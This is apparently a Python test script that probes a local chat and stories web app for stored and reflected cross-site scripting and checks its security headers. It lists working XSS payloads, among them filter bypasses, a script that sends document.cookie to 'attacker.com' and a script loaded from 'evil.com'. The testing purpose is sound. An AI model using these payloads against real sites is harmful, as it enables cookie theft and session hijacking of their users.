#!/usr/bin/env python3
"""
03_xss.py — Stored & Reflected XSS Attack
==========================================
Tests whether the server stores and reflects unsanitized HTML/JS
in chat messages, stories, and usernames.

In a WebSocket chat scenario, stored XSS is critical:
  - Payload stored in DB → returned via /api/chat/history/{room}
  - If rendered as innerHTML in the browser, script executes for ALL users

Findings to look for:
  VULN: XSS payload returned raw from /api/chat/history
  VULN: XSS in stories content/caption stored and returned raw
  VULN: XSS in username field that propagates to all chat messages
  SAFE: escapeHtml() in app.js correctly sanitizes on render
"""

import requests
import json

BASE_URL = "http://localhost:8090"

# Common XSS payloads
XSS_PAYLOADS = [
    # Basic script tag
    ("<script>alert('XSS')</script>",             "basic script tag"),
    ("<script>alert(document.cookie)</script>",   "cookie steal attempt"),
    # Event handlers
    ("<img src=x onerror=alert('XSS')>",          "img onerror"),
    ("<svg onload=alert('XSS')>",                 "svg onload"),
    ("<body onload=alert('XSS')>",                "body onload"),
    ("<input onfocus=alert('XSS') autofocus>",    "input autofocus"),
    # Attribute injection
    ("\" onmouseover=\"alert('XSS')",             "attribute injection"),
    ("' onclick='alert(1)'",                      "single-quote attr"),
    # JavaScript URIs
    ("<a href='javascript:alert(1)'>click</a>",   "javascript href"),
    # HTML5 / bypass attempts
    ("<details open ontoggle=alert('XSS')>",      "details ontoggle"),
    ("<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", "math bypass"),
    # Template literal (won't work server-side, tests client render)
    ("${alert('XSS')}",                           "template literal"),
    ("{{7*7}}",                                    "SSTI template probe"),
    # Encoded variants
    ("&lt;script&gt;alert(1)&lt;/script&gt;",    "html-encoded (should be safe)"),
    ("<scr\x00ipt>alert(1)</scr\x00ipt>",         "null-byte bypass"),
    # Beacon / exfil simulation
    ("<script>fetch('http://attacker.com/?c='+document.cookie)</script>", "cookie exfil"),
    # Mega payload
    ("<SCRIPT SRC=//evil.com/xss.js></SCRIPT>",  "external script src"),
]


def register_user(username):
    r = requests.post(f"{BASE_URL}/api/auth/guest",
                      json={"username": username[:32]}, timeout=5)
    return r.status_code == 200


def send_message_direct(sender, content, room="public"):
    """Simulate sending a message via the REST-accessible path (guest auth + POST)."""
    # We can't easily STOMP over HTTP here, so we'll test the history endpoint after
    # creating a story with XSS content (which IS a REST endpoint)
    pass


def post_story(username, content, media_url="https://example.com/img.jpg"):
    r = requests.post(f"{BASE_URL}/api/stories",
                      json={"username": username, "content": content, "mediaUrl": media_url},
                      timeout=5)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, {}


def get_stories():
    r = requests.get(f"{BASE_URL}/api/stories/active", timeout=5)
    try:
        return r.json()
    except Exception:
        return []


def get_history(room="public"):
    r = requests.get(f"{BASE_URL}/api/chat/history/{room}", timeout=5)
    try:
        return r.json()
    except Exception:
        return []


def section(title):
    print(f"\n{'='*65}")
    print(f"  {title}")
    print(f"{'='*65}")


def check_payload_in_response(payload, response_str, context):
    """Check if raw payload appears unescaped in response."""
    dangerous_tags = ["<script", "onerror=", "onload=", "onclick=", "onfocus=",
                      "ontoggle=", "javascript:", "onmouseover="]
    found_raw = any(tag in response_str.lower() for tag in dangerous_tags)
    if found_raw and payload.lower().split(">")[0].replace("<", "") in response_str.lower():
        print(f"    🚨 STORED XSS: Raw payload found in {context} response!")
        return True
    return False


def run():
    print("=" * 65)
    print("  NEXUS ARENA — XSS (Cross-Site Scripting) Test Suite")
    print("=" * 65)
    print(f"  Server : {BASE_URL}")
    print(f"  Payloads: {len(XSS_PAYLOADS)}")
    print()

    vulns = 0

    # -------------------------------------------------------------------------
    # Phase 1: XSS via Story Content (stored)
    # -------------------------------------------------------------------------
    section("PHASE 1: Stored XSS — Story caption field")
    for payload, label in XSS_PAYLOADS:
        code, body = post_story("XSSTester", payload)
        status = "STORED" if body.get("id") or code == 200 else "BLOCKED"
        flag   = ""

        if status == "STORED":
            # Fetch stories and check if payload is raw
            stories = get_stories()
            raw_resp = json.dumps(stories)
            if check_payload_in_response(payload, raw_resp, "stories API"):
                flag = "  🚨 UNESCAPED IN API RESPONSE"
                vulns += 1

        print(f"  [{status:7s}] {label:<42} {flag}")

    # -------------------------------------------------------------------------
    # Phase 2: XSS via Username Registration
    # -------------------------------------------------------------------------
    section("PHASE 2: XSS via Username (propagates to all messages)")
    for payload, label in XSS_PAYLOADS[:8]:
        short = payload[:32]  # usernames are max 32 chars
        r = requests.post(f"{BASE_URL}/api/auth/guest",
                          json={"username": short}, timeout=5)
        try:
            body = r.json()
        except Exception:
            body = {}

        stored_name = body.get("username", "")
        # Check if the username stored contains raw HTML
        if any(c in stored_name for c in ["<", ">", "'"]):
            print(f"  🚨 RAW HTML in stored username: '{stored_name[:50]}'  [{label}]")
            vulns += 1
        else:
            print(f"  [OK     ] Username sanitized/rejected | '{stored_name[:30]}' | [{label}]")

    # -------------------------------------------------------------------------
    # Phase 3: Reflected XSS via Query Parameters
    # -------------------------------------------------------------------------
    section("PHASE 3: Reflected XSS — Query parameters")
    for payload, label in XSS_PAYLOADS[:6]:
        r = requests.get(f"{BASE_URL}/?username={requests.utils.quote(payload)}", timeout=5)
        if payload in r.text or "<script" in r.text.lower():
            print(f"  🚨 REFLECTED: Payload found raw in HTML response! [{label}]")
            vulns += 1
        else:
            print(f"  [SAFE   ] Payload not reflected in page response | [{label}]")

    # -------------------------------------------------------------------------
    # Phase 4: XSS via Story Media URL (open redirect / JS injection)
    # -------------------------------------------------------------------------
    section("PHASE 4: XSS via Story mediaUrl field")
    evil_urls = [
        ("javascript:alert('XSS')",       "js: protocol in mediaUrl"),
        ("data:text/html,<script>alert(1)</script>", "data: URI XSS"),
        ("//evil.com/image.png",           "protocol-relative URL"),
        ("<img src=x onerror=alert(1)>",  "HTML in URL field"),
    ]
    for url, label in evil_urls:
        code, body = post_story("URLTester", "test caption", url)
        stored = body.get("mediaUrl", "") or json.dumps(body)
        if "javascript:" in stored or "data:text" in stored:
            print(f"  🚨 DANGEROUS URL stored in DB! [{label}]")
            vulns += 1
        else:
            print(f"  [OK     ] Checked: {label}")

    # -------------------------------------------------------------------------
    # Phase 5: Content-Type Sniffing
    # -------------------------------------------------------------------------
    section("PHASE 5: Security Headers Check")
    r = requests.get(f"{BASE_URL}/", timeout=5)
    headers_to_check = {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options":        "DENY or SAMEORIGIN",
        "Content-Security-Policy":"required",
        "X-XSS-Protection":       "1; mode=block",
        "Strict-Transport-Security": "HSTS (not required for HTTP)",
    }
    for h, expected in headers_to_check.items():
        val = r.headers.get(h, None)
        if val:
            print(f"  ✔  {h}: {val}")
        else:
            print(f"  🚨 MISSING: {h}  (expected: {expected})")
            if h in ("X-Content-Type-Options", "Content-Security-Policy"):
                vulns += 1

    # -------------------------------------------------------------------------
    # Summary
    # -------------------------------------------------------------------------
    section("RESULTS")
    if vulns == 0:
        print("  ✔  No server-side XSS vulnerabilities detected.")
        print()
        print("  NOTE: Client-side safety depends on app.js escapeHtml().")
        print("  Verify that chatMessages are rendered via textContent / escapeHtml()")
        print("  and NOT via raw innerHTML with unescaped user input.")
    else:
        print(f"  🚨 {vulns} XSS vulnerability(ies) found!")
        print("  Fix: Sanitize all user input before storage.")
        print("  Fix: Add Content-Security-Policy header.")
        print("  Fix: Add X-Content-Type-Options: nosniff header.")

    print(f"\n{'='*65}")
    print(f"  XSS TEST COMPLETE")
    print(f"{'='*65}\n")


if __name__ == "__main__":
    run()
